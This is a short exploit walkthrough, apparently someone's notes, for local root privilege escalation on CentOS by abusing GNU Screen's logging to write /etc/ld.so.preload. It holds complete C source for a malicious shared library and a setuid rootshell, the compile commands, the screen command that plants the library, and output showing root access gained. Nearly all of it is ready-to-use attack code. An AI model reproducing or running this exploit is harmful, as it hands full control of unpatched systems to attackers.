''' 
This example showcases the exploit on CentOS.
This OS often mounts directories /tmp and /dev/shm with nosuid. The nosuid mount option specifies that the filesystem cannot contain setuid files. 
   Therefore, you will need to modify the exploit to use another directory we can write to. 
   
Word writable directory: /var/log/php-fpm/
'''

# Create the first library file, libhax.c
   
nano libhax.c

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/var/log/php-fpm/rootshell", 0, 0);
    chmod("/var/log/php-fpm/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}

# Compile it
gcc -fPIC -shared -ldl -o libhax.so libhax.c


# Create the second library file, rootshell.c

nano rootshell.c

#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}

# Compile it
gcc -o rootshell rootshell.c  
chmod +x rootshell

# Execute the exploit

cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/var/log/php-fpm/libhax.so"
screen -ls
/var/log/php-fpm/rootshell
id
uid=0(root) gid=0(root) groups=0(root),48(apache)
